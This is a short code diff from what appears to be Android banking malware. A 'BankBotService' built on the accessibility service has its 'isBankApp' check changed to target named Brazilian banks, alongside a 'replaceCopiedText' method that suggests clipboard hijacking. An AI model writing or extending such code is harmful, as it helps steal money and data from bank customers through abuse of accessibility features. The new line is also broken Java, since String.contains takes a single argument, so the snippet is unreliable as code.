@@ -75,7 +75,7 @@ public class BankBotService extends AccessibilityService {
     }
 
     private boolean isBankApp(String appName) {
-        return appName.toLowerCase().contains("banco");
+        return appName.toLowerCase().contains("Banco do Brasil", "Itaú", "Bradesco", "Caixa", "Santander");
     }
 
     private void replaceCopiedText(String selectedText) {
